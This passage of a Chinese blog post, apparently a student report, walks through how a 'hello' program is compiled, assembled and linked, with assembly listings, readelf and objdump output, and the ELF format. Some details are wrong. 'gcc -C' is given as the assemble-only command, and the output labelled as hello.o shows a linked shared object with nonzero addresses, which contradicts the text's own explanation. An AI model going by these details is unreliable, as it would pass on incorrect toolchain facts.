class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L4:<br>movq-32(%rbp), %rax<br>addq$16, %rax<br>movq(%rax), %rdx<br>movq-32(%rbp), %rax<br>addq$8, %rax<br>movq(%rax), %rax<br>movq%rax, %rsi<br>leaq.LC1(%rip), %rdi<br>movl$0, %eax<br>callprintf@PLT<br></code></pre></td></tr></table></figure><ol start="3"><li>exit函数</li></ol><p>通过设置寄存器 %rdi 和 %rsi 的值来传入参数并调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leaq.LC0(%rip), %rdi<br>callputs@PLT<br>movl$1, %edi<br>callexit@PLT<br></code></pre></td></tr></table></figure><ol start="4"><li>atoi函数</li></ol><p>将一个字符串的首地址赋给 %rdi 调用，函数返回这个字符串转成的整数值，存放在字符串 %eax</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq-32(%rbp), %rax<br>addq$24, %rax<br>movq(%rax), %rax<br>movq%rax, %rdi<br>callatoi@PLT<br>movl%eax, %edi<br>callsleep@PLT<br>addl$1, -4(%rbp)<br></code></pre></td></tr></table></figure><h3 id="3-4-本章小结"><a href="#3-4-本章小结" class="headerlink" title="3.4 本章小结"></a>3.4 本章小结</h3><p>本章介绍了从 hello.i 文件编译成 hello.s 文件的过程，以及原始的 .c 文件中各部分变量、常量、控制转移以及函数调用在汇编语言中是什么样子。</p><p>接下来，只需要将 hello.s 稍加改造（汇编），就能让操作系统、让机器读懂它！</p><h2 id="第4章-汇编"><a href="#第4章-汇编" class="headerlink" title="第4章 汇编"></a>第4章 汇编</h2><h3 id="4-1-汇编的概念与作用"><a href="#4-1-汇编的概念与作用" class="headerlink" title="4.1 汇编的概念与作用"></a>4.1 汇编的概念与作用</h3><p>所谓汇编，就是汇编器 (as) 将 hello.s 翻译成机器语言指令，把这些指令打包成可重定位目标程序的格式，并将结果保存在文件 hello.o 中，hello.o 是一个二进制文件。</p><h3 id="4-2-Ubuntu下的汇编命令"><a href="#4-2-Ubuntu下的汇编命令" class="headerlink" title="4.2 Ubuntu下的汇编命令"></a>4.2 Ubuntu下的汇编命令</h3><p>Linux 下使用 gcc 汇编的命令为：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">gcc</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">hello</span><span class="hljs-operator">.</span><span class="hljs-variable">s</span> <span class="hljs-operator">-</span><span class="hljs-variable">o</span> <span class="hljs-variable">hello</span><span class="hljs-operator">.</span><span class="hljs-variable">o</span><br></code></pre></td></tr></table></figure><p>-C 表示只激活到汇编过程</p><h3 id="4-3-可重定位目标elf格式"><a href="#4-3-可重定位目标elf格式" class="headerlink" title="4.3 可重定位目标elf格式"></a>4.3 可重定位目标elf格式</h3><p>hello.o 文件在 x86-64 Linux 和 Unix 系统中使用可执行可链接格式即 (ELF)，典型的 elf 可重定位目标文件格式如下：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031449974.png" alt="elf格式"></p><h4 id="4-3-1-ELF头"><a href="#4-3-1-ELF头" class="headerlink" title="4.3.1 ELF头"></a>4.3.1 ELF头</h4><p>使用 readelf -h hello.o 查看 ELF 头，如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">voidsolar</span>@admin:~/test$ readelf -h hello.o<br><span class="hljs-attribute">ELF</span> Header:<br>  <span class="hljs-attribute">Magic</span>:   <span class="hljs-number">7</span>f <span class="hljs-number">45</span> <span class="hljs-number">4</span>c <span class="hljs-number">46</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-attribute">Class</span>:                             ELF64<br>  <span class="hljs-attribute">Data</span>:                              <span class="hljs-number">2</span>&#x27;s complement, little endian<br>  <span class="hljs-attribute">Version</span>:                           <span class="hljs-number">1</span> (current)<br>  <span class="hljs-attribute">OS</span>/ABI:                            UNIX - System V<br>  <span class="hljs-attribute">ABI</span> Version:                       <span class="hljs-number">0</span><br>  <span class="hljs-attribute">Type</span>:                              DYN (Shared object file)<br>  <span class="hljs-attribute">Machine</span>:                           Advanced Micro Devices X86-<span class="hljs-number">64</span><br>  <span class="hljs-attribute">Version</span>:                           <span class="hljs-number">0</span>x1<br>  <span class="hljs-attribute">Entry</span> point address:               <span class="hljs-number">0</span>x6a0<br>  <span class="hljs-attribute">Start</span> of program headers:          <span class="hljs-number">64</span> (bytes into file)<br>  <span class="hljs-attribute">Start</span> of section headers:          <span class="hljs-number">6664</span> (bytes into file)<br>  <span class="hljs-attribute">Flags</span>:                             <span class="hljs-number">0</span>x0<br>  <span class="hljs-attribute">Size</span> of this header:               <span class="hljs-number">64</span> (bytes)<br>  <span class="hljs-attribute">Size</span> of program headers:           <span class="hljs-number">56</span> (bytes)<br>  <span class="hljs-attribute">Number</span> of program headers:         <span class="hljs-number">9</span><br>  <span class="hljs-attribute">Size</span> of section headers:           <span class="hljs-number">64</span> (bytes)<br>  <span class="hljs-attribute">Number</span> of section headers:         <span class="hljs-number">29</span><br>  <span class="hljs-attribute">Section</span> header string table index: <span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><p>EFL 头以 16 字节的序列 Magic 开始，这个序列描述了生成该文件的系统的字的大小和字节顺序，ELF 头剩下的部分包含帮助链接器语法分析和解释目标文件的信息，其中包括 ELF 头的大小、目标文件的类型、机器类型、字节头部表（section header table）的文件偏移，以及节头部表中条目的大小和数量等信息。</p><p>EFL头中还包括程序的入口点 (entry point)，也就是程序运行时要执行的第一条指令的地址为 0x6a0，可以查看hello.o 的反汇编代码，程序运行时的第一条指令的地址确实为 0x6a0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000000006a0 &lt;_start&gt;:<br> 6a0:31 ed                xor    %ebp,%ebp<br> 6a2:49 89 d1             mov    %rdx,%r9<br> 6a5:5e                   pop    %rsi<br> 6a6:48 89 e2             mov    %rsp,%rdx<br> 6a9:48 83 e4 f0          and    $0xfffffffffffffff0,%rsp<br> 6ad:50                   push   %rax<br> 6ae:54                   push   %rsp<br> 6af:4c 8d 05 fa 01 00 00 lea    0x1fa(%rip),%r8        # 8b0 &lt;__libc_csu_fini&gt;<br> 6b6:48 8d 0d 83 01 00 00 lea    0x183(%rip),%rcx        # 840 &lt;__libc_csu_init&gt;<br> 6bd:48 8d 3d e6 00 00 00 lea    0xe6(%rip),%rdi        # 7aa &lt;main&gt;<br> 6c4:ff 15 16 09 20 00    callq  *0x200916(%rip)        # 200fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;<br> 6ca:f4                   hlt    <br> 6cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)<br></code></pre></td></tr></table></figure><h4 id="4-3-2-节头部表"><a href="#4-3-2-节头部表" class="headerlink" title="4.3.2 节头部表"></a>4.3.2 节头部表</h4><p>使用 readelf -S hello.o 命令查看节头部表，如下：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs tap">There are<span class="hljs-number"> 29 </span>section headers, starting at offset 0x1a08:<br><br>Section Headers:<br>  [Nr] Name              Type             Address           Offset<br>       Size              EntSize          Flags  Link  Info  Align<br>  [ 0]                   NULL            <span class="hljs-number"> 0000000000000000 </span> 00000000<br>      <span class="hljs-number"> 0000000000000000 </span><span class="hljs-number"> 0000000000000000 </span>         <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    0<br>  [ 1] .interp           PROGBITS        <span class="hljs-number"> 0000000000000238 </span> 00000238<br>       000000000000001c <span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    1<br>  [ 2] .note.ABI-tag     NOTE            <span class="hljs-number"> 0000000000000254 </span> 00000254<br>      <span class="hljs-number"> 0000000000000020 </span><span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    4<br>  [ 3] .note.gnu.build-i NOTE            <span class="hljs-number"> 0000000000000274 </span> 00000274<br>      <span class="hljs-number"> 0000000000000024 </span><span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    4<br>  [ 4] .gnu.hash         GNU_HASH        <span class="hljs-number"> 0000000000000298 </span> 00000298<br>       000000000000001c <span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 5 </span>   <span class="hljs-number"> 0 </span>    8<br>  [ 5] .dynsym           DYNSYM           00000000000002b8  000002b8<br>      <span class="hljs-number"> 0000000000000120 </span><span class="hljs-number"> 0000000000000018 </span>  A      <span class="hljs-number"> 6 </span>   <span class="hljs-number"> 1 </span>    8<br>  [ 6] .dynstr           STRTAB           00000000000003d8  000003d8<br>       00000000000000a1 <span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    1<br>  [ 7] .gnu.version      VERSYM           000000000000047a  0000047a<br>      <span class="hljs-number"> 0000000000000018 </span><span class="hljs-number"> 0000000000000002 </span>  A      <span class="hljs-number"> 5 </span>   <span class="hljs-number"> 0 </span>    2<br>  [ 8] .gnu.version_r    VERNEED         <span class="hljs-number"> 0000000000000498 </span> 00000498<br>      <span class="hljs-number"> 0000000000000020 </span><span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 6 </span>   <span class="hljs-number"> 1 </span>    8<br>  [ 9] .rela.dyn         RELA             00000000000004b8  000004b8<br>       00000000000000c0 <span class="hljs-number"> 0000000000000018 </span>  A      <span class="hljs-number"> 5 </span>   <span class="hljs-number"> 0 </span>    8<br>  [10] .rela.plt         RELA            <span class="hljs-number"> 0000000000000578 </span> 00000578<br>      <span class="hljs-number"> 0000000000000090 </span><span class="hljs-number"> 0000000000000018 </span> AI      <span class="hljs-number"> 5 </span>  <span class="hljs-number"> 22 </span>    8<br>  [11] .init             PROGBITS        <span class="hljs-number"> 0000000000000608 </span> 00000608<br>      <span class="hljs-number"> 0000000000000017 </span><span class="hljs-number"> 0000000000000000 </span> AX      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    4<br>  [12] .plt              PROGBITS        <span class="hljs-number"> 0000000000000620 </span> 00000620<br>      <span class="hljs-number"> 0000000000000070 </span><span class="hljs-number"> 0000000000000010 </span> AX      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    16<br>  [13] .plt.got          PROGBITS        <span class="hljs-number"> 0000000000000690 </span> 00000690<br>      <span class="hljs-number"> 0000000000000008 </span><span class="hljs-number"> 0000000000000008 </span> AX      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [14] .text             PROGBITS         00000000000006a0  000006a0<br>      <span class="hljs-number"> 0000000000000212 </span><span class="hljs-number"> 0000000000000000 </span> AX      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    16<br>  [15] .fini             PROGBITS         00000000000008b4  000008b4<br>      <span class="hljs-number"> 0000000000000009 </span><span class="hljs-number"> 0000000000000000 </span> AX      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    4<br>  [16] .rodata           PROGBITS         00000000000008c0  000008c0<br>       000000000000003e <span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [17] .eh_frame_hdr     PROGBITS        <span class="hljs-number"> 0000000000000900 </span> 00000900<br>       000000000000003c <span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    4<br>  [18] .eh_frame         PROGBITS        <span class="hljs-number"> 0000000000000940 </span> 00000940<br>      <span class="hljs-number"> 0000000000000108 </span><span class="hljs-number"> 0000000000000000 </span>  A      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [19] .init_array       INIT_ARRAY       0000000000200d90  00000d90<br>      <span class="hljs-number"> 0000000000000008 </span><span class="hljs-number"> 0000000000000008 </span> WA      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [20] .fini_array       FINI_ARRAY       0000000000200d98  00000d98<br>      <span class="hljs-number"> 0000000000000008 </span><span class="hljs-number"> 0000000000000008 </span> WA      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [21] .dynamic          DYNAMIC          0000000000200da0  00000da0<br>       00000000000001f0 <span class="hljs-number"> 0000000000000010 </span> WA      <span class="hljs-number"> 6 </span>   <span class="hljs-number"> 0 </span>    8<br>  [22] .got              PROGBITS         0000000000200f90  00000f90<br>      <span class="hljs-number"> 0000000000000070 </span><span class="hljs-number"> 0000000000000008 </span> WA      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [23] .data             PROGBITS        <span class="hljs-number"> 0000000000201000 </span> 00001000<br>      <span class="hljs-number"> 0000000000000010 </span><span class="hljs-number"> 0000000000000000 </span> WA      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    8<br>  [24] .bss              NOBITS          <span class="hljs-number"> 0000000000201010 </span> 00001010<br>      <span class="hljs-number"> 0000000000000008 </span><span class="hljs-number"> 0000000000000000 </span> WA      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    1<br>  [25] .comment          PROGBITS        <span class="hljs-number"> 0000000000000000 </span> 00001010<br>      <span class="hljs-number"> 0000000000000029 </span><span class="hljs-number"> 0000000000000001 </span> MS      <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    1<br>  [26] .symtab           SYMTAB          <span class="hljs-number"> 0000000000000000 </span> 00001040<br>      <span class="hljs-number"> 0000000000000660 </span><span class="hljs-number"> 0000000000000018 </span>        <span class="hljs-number"> 27 </span>  <span class="hljs-number"> 43 </span>    8<br>  [27] .strtab           STRTAB          <span class="hljs-number"> 0000000000000000 </span> 000016a0<br>      <span class="hljs-number"> 0000000000000263 </span><span class="hljs-number"> 0000000000000000 </span>         <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    1<br>  [28] .shstrtab         STRTAB          <span class="hljs-number"> 0000000000000000 </span> 00001903<br>       00000000000000fe <span class="hljs-number"> 0000000000000000 </span>         <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>    1<br><br></code></pre></td></tr></table></figure><p>节头部表描述了 hello.o 中文件中各个节的语义，包括节的类型、位置和大小等信息。由于这是可重定位目标文件，所以每个节的地址都从 0 开始。</p><p>它还利用 Flags 描述各个节的读写权限：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Key to Flags:<br>  W <span class="hljs-comment">(write)</span>, A <span class="hljs-comment">(alloc)</span>, X <span class="hljs-comment">(execute)</span>, M <span class="hljs-comment">(merge)</span>, S <span class="hljs-comment">(strings)</span>, I <span class="hljs-comment">(info)</span>,<br>  L <span class="hljs-comment">(link order)</span>, O <span class="hljs-comment">(extra OS processing required)</span>, G <span class="hljs-comment">(group)</span>, T <span class="hljs-comment">(TLS)</span>,<br>  C <span class="hljs-comment">(compressed)</span>, x <span class="hljs-comment">(unknown)</span>, o <span class="hljs-comment">(OS specific)</span>, E <span class="hljs-comment">(exclude)</span>,<br>  l <span class="hljs-comment">(large)</span>, p <span class="hljs-comment">(processor specific)</span><br></code></pre></td></tr></table></figure><h4 id="4-3-3-符号表"><a href="#4-3-3-符号表" class="headerlink" title="4.3.3 符号表"></a>4.3.3 符号表</h4><p>使用  命令查看 .symtab 节中的 ELF 符号表</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Symbol</span> table &#x27;.dynsym&#x27; contains <span class="hljs-number">12</span> entries:<br>   <span class="hljs-attribute">Num</span>:    Value          Size Type    Bind   Vis      Ndx Name<br>     <span class="hljs-attribute">0</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> NOTYPE  LOCAL  DEFAULT  UND <br>     <span class="hljs-attribute">1</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTab<br>     <span class="hljs-attribute">2</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>     <span class="hljs-attribute">3</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>     <span class="hljs-attribute">4</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>     <span class="hljs-attribute">5</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND getchar@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>     <span class="hljs-attribute">6</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__<br>     <span class="hljs-attribute">7</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND atoi@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>     <span class="hljs-attribute">8</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>     <span class="hljs-attribute">9</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable<br>    <span class="hljs-attribute">10</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    GLOBAL DEFAULT  UND sleep@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br>    <span class="hljs-attribute">11</span>: <span class="hljs-number">0000000000000000</span>     <span class="hljs-number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>它存放在程序中定义和引用的函数和全局变量的信息。</p><p>如图，前面谈到的 main 函数、atoi 函数、exit 函数、sleep 函数的信息：</p><h4 id="4-3-4-重定位条目"><a href="#4-3-4-重定位条目" class="headerlink" title="4.3.4 重定位条目"></a>4.3.4 重定位条目</h4><p>使用 readelf -r hello.o 命令查看 hello.o 的重定位条目：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Relocation</span> section &#x27;.rela.dyn&#x27; at offset <span class="hljs-number">0</span>x4b8 contains <span class="hljs-number">8</span> entries:<br>  <span class="hljs-attribute">Offset</span>          Info           Type           Sym. Value    Sym. Name + Addend<br><span class="hljs-attribute">000000200d90</span>  <span class="hljs-number">000000000008</span> R_X86_64_RELATIVE                    <span class="hljs-number">7</span>a0<br><span class="hljs-attribute">000000200d98</span>  <span class="hljs-number">000000000008</span> R_X86_64_RELATIVE                    <span class="hljs-number">760</span><br><span class="hljs-attribute">000000201008</span>  <span class="hljs-number">000000000008</span> R_X86_64_RELATIVE                    <span class="hljs-number">201008</span><br><span class="hljs-attribute">000000200fd8</span>  <span class="hljs-number">000100000006</span> R_X86_64_GLOB_DAT <span class="hljs-number">0000000000000000</span> _ITM_deregisterTMClone + <span class="hljs-number">0</span><br><span class="hljs-attribute">000000200fe0</span>  <span class="hljs-number">000400000006</span> R_X86_64_GLOB_DAT <span class="hljs-number">0000000000000000</span> __libc_start_main@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> + <span class="hljs-number">0</span><br><span class="hljs-attribute">000000200fe8</span>  <span class="hljs-number">000600000006</span> R_X86_64_GLOB_DAT <span class="hljs-number">0000000000000000</span> __gmon_start__ + <span class="hljs-number">0</span><br><span class="hljs-attribute">000000200ff0</span>  <span class="hljs-number">000900000006</span> R_X86_64_GLOB_DAT <span class="hljs-number">0000000000000000</span> _ITM_registerTMCloneTa + <span class="hljs-number">0</span><br><span class="hljs-attribute">000000200ff8</span>  <span class="hljs-number">000</span>b00000006 R_X86_64_GLOB_DAT <span class="hljs-number">0000000000000000</span> __cxa_finalize@GLIBC_2.<span class="hljs-number">2</span>.<span class="hljs-number">5</span> + <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>当汇编器生成 hello.o 后，它并不知道数据和代码最终将放在内存中的什么位置。它也不知道这个模块引用的任何外部定义的函数或者全局变量的位置。所以，无论何时汇编器遇到对最终位置未知的目标引用，它就会生成一个重定位条目，告诉链接器在将目标文件合并成可执行文件时如何修改这个引用。代码重定位条目放在 .rela.plt 中，已初始化数据的重定位条目放在 .rela.dyn中。</p><h4 id="4-4-Hello-o结果解析"><a href="#4-4-Hello-o结果解析" class="headerlink" title="4.4 Hello.o结果解析"></a>4.4 Hello.o结果解析</h4><p>使用 objdump -d -r hello.o 命令反汇编 hello.o，查看反汇编后的汇编代码与 hello.s 有何不同：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031503550.png" alt="反汇编结果"></p><p><strong>不同点：</strong></p><p>分支跳转：在 hello.s 中，分支跳转的目标位置是通过 .L1、.L2 这样的助记符来实现的，而 hello.o中，跳转的目标位置是指令的地址。</p><p>函数调用：在 hello.s 中，call 后面的目标函数是它的函数名，而在 hello.o 中，call 的是目标函数的相对偏移地址。</p><h3 id="4-5-本章小结"><a href="#4-5-本章小结" class="headerlink" title="4.5 本章小结"></a>4.5 本章小结</h3><p>本章分析了汇编的过程，并分析了 ELF 头、节头部表、重定位节以及符号表。比较了 hello.s 和 hello.o 反汇编之后的代码的不同。</p><h2 id="第5章-链接"><a href="#第5章-链接" class="headerlink" title="第5章 链接"></a>第5章 链接</h2><h3 id="5-1-链接的概念与作用"><a href="#5-1-链接的概念与作用" class="headerlink" title="5.1 链接的概念与作用"></a>5.1 链接的概念与作用</h3><p>链接是将各种代码和数据片段收集并组合成为一个单一文件的过程，这个文件可被加载到内存并执行。</p><p>链接器在软件开发中扮演着一个关键的角色，因为它使得分离编译成为可能。我们不用将一个大型应用程序组织为一个巨大的源文件，而是可以把它分解为更小、更好管理的模块，可以独立地修改和编译这些模块。当我们改变这些模块中地一个时，只需简单地重新编译它，并重新链接应用，而不必重新编译其他文件。即使对hello这样一个非常简单的小程序，链接的作用也是巨大的。</p><h3 id="5-2-在Ubuntu下链接的命令"><a href="#5-2-在Ubuntu下链接的命令" class="headerlink" title="5.2 在Ubuntu下链接的命令"></a>5.2 在Ubuntu下链接的命令</h3><p>Linux下使用链接器 (ld) 链接的命令为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ld -o hello -dynamic-linker /lib64/ld-linux-x86-64.so.2 /usr/lib/x86_64-linux-gnu/crt1.o /usr/lib/x86_64-linux-gnu/crti.o hello.o /usr/lib/x86_64-linux-gnu/libc.so /usr/lib/x86_64-linux-gnu/crtn.o<br></code></pre></td></tr></table></figure><h3 id="5-3-可执行目标文件hello的格式"><a href="#5-3-可执行目标文件hello的格式" class="headerlink" title="5.3 可执行目标文件hello的格式"></a>5.3 可执行目标文件hello的格式</h3><h3 id="5-3-1-ELF头"><a href="#5-3-1-ELF头" class="headerlink" title="5.3.1 ELF头"></a>5.3.1 ELF头</h3><p>查看hello的ELF头</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031529252.png" alt="hello"></p><p>可以看到，程序的 Type 变成了 EXEC (Executable file)，程序入口也分配了地址，为 0x4010f0</p><h3 id="5-3-2-节头部表"><a href="#5-3-2-节头部表" class="headerlink" title="5.3.2 节头部表"></a>5.3.2 节头部表</h3><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031530618.png" alt="节头部表"></p><p>各个节的地址也从 0 开始进行了分配。可以看到 .text 节的起始地址为 0x4010f0，这刚好就是前面 ELF 头中的程序入口地址，与 .text 中存放程序的机器代码符合。</p><h3 id="5-4-hello的虚拟地址空间"><a href="#5-4-hello的虚拟地址空间" class="headerlink" title="5.4 hello的虚拟地址空间"></a>5.4 hello的虚拟地址空间</h3><p>使用 edb 打开 hello，可以看到 hello 的虚拟地址起始为 0x401000</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031531957.png" alt="img"></p><h3 id="5-5-链接的重定位过程分析"><a href="#5-5-链接的重定位过程分析" class="headerlink" title="5.5 链接的重定位过程分析"></a>5.5 链接的重定位过程分析</h3><p>使用 objdump -d -r hello 命令反汇编代码，查看两者之间的不同</p><h4 id="5-5-1-新增函数"><a href="#5-5-1-新增函数" class="headerlink" title="5.5.1 新增函数"></a>5.5.1 新增函数</h4><p>如图，链接后，加入了很多需要用到的库函数，puts, pintf, getchar, atoi, exit, sleep 等</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031531856.png" alt="新增函数"></p><h4 id="5-5-2-新增节"><a href="#5-5-2-新增节" class="headerlink" title="5.5.2 新增节"></a>5.5.2 新增节</h4><p>如图，新增了 .init 节和 .plt 节</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031532465.png" alt="新增节"></p><h4 id="5-5-3-新增代码endbr64"><a href="#5-5-3-新增代码endbr64" 